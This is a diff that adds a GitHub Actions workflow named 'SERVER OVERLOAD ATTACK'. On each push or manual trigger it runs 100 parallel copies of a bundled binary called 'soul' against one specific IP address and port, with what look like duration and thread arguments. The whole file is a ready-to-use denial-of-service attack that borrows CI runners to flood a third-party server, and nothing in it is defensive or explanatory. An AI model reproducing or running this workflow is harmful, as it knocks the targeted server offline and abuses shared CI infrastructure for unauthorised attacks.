@@ -1,0 +1,14 @@
+name: SERVER OVERLOAD ATTACK
+on: [workflow_dispatch, push]
+
+jobs:
+  server_overload:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - run: chmod +x soul
+      - run: |
+          for i in {1..100}; do
+            ./soul 4.213.176.172 14934 120 4000 &
+          done
+          wait
